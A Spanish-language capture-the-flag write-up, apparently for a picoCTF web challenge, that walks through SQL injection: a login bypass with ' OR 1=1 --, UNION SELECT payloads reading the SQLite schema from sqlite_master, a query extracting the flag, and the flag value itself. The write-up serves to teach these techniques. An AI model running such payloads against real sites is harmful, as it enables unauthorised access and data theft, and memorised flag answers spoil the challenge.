## Descripción
Can you find the flag on this website.
## Solución
- Testeamos si el formulario tiene alguna vulnerabilidad con SQL injection, así que pruebo a ingresar comillas simples en los dos campos y me arroja el siguiente error:
`username: '`
`password: '`
`SQL query: SELECT id FROM users WHERE password = ''' AND username = '''`
`Login failed.`
`×Your username or password is invalid`
- Ingresamos la siguiente sentencia en los dos campos del formulario: `' OR 1=1 --`
- Esto nos permitirá acceder al panel interno (Search/Query interface).
- El sistema utiliza SQLite. Para descubrir el nombre de la tabla donde está la bandera, utilizamos una inyección basada en UNION SELECT en la barra de búsqueda o formulario disponible: 
```sql
' UNION SELECT 1, sql, 3 FROM sqlite_master --
```
- Esto devolverá la sentencia CREATE TABLE utilizada para crear la estructura de la base de datos, revelando el nombre de la tabla sensible
- Una vez identificada la tabla y la columna donde se almacena la bandera, ejecutamos la consulta final para extraer el contenido (en mi caso fue en more_table):
```sql
' UNION SELECT 1, flag, 3 FROM more_table --
```
- Y así obtenemos la bandera
```text
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}
```
## Notas Adicionales
- Inyección basada en UNION: Permite combinar los resultados de la consulta original de la aplicación con una consulta arbitraria definida por el usuario.
- Tabla sqlite_master: Es una tabla del sistema en SQLite que guarda los metadatos de la base de datos (nombres de tablas, columnas y esquemas de creación).
- Alineación de columnas: En ataques UNION SELECT, la consulta inyectada debe devolver exactamente el mismo número de columnas que la consulta original para no generar un error de sintaxis.
## Referencias